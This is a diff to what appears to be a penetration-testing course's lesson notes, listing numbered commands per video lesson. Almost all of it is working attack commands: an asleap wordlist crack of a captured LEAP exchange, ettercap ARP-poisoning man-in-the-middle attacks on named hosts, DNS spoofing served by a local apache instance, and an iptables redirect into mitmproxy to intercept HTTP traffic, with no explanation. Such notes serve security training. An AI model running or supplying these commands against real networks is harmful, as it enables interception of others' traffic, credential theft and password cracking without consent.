@@ -249,4 +249,57 @@ v-47)
 
 7) asleap -C a5:5e:3a:5f:4b:d8:db:ff -R ee:25:4c:8b:84:f8:38:9b:4a:a2:ad:e3:66:87:a3:b7:f1:ba:ba:f2:b0:36:fa:cd -W /root/wordlist
 
-8) 
+section -9)
+
+v-50)
+
+1) leafpad /etc/ettercap/etter.conf
+
+2) ettercap --help 
+
+3) ettercap -Tq ///
+
+v-51)
+
+4) ifconfig eth0
+
+5) ettercap -Tq -M arp:remote -i eth0 /10.20.215.1// /10.20.215.9//
+
+6) arp -a
+
+v-52)
+
+7) ifconfig
+
+8) ettercap -Tq -M arp:remote -i wlan0 -S ///
+
+v-53)
+
+9) leafpad /etc/ettercap/etter.dns
+
+10) service apache2 start
+
+11) ettercap -Tq -M arp:remote -i wlan0 -S -P dns_spoof /192.168.2.3// /192.168.2.1//
+
+v-54)
+
+12) ettercap -Tq -M arp:oneway -i eth0 -S /10.20.215.9// /10.20.215.1//
+
+13) wireshark &
+
+section-10)
+
+v-56)
+
+14) cd /opt/mitmproxy/
+
+v-60)
+
+15) ettercap -Tq -M arp:remote -i eth0 -S /10.20.215.9// /10.20.215.1//
+
+16) iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+
+17) ./mitmweb --transparent 
+
+18) iptables -t nat --flush
+
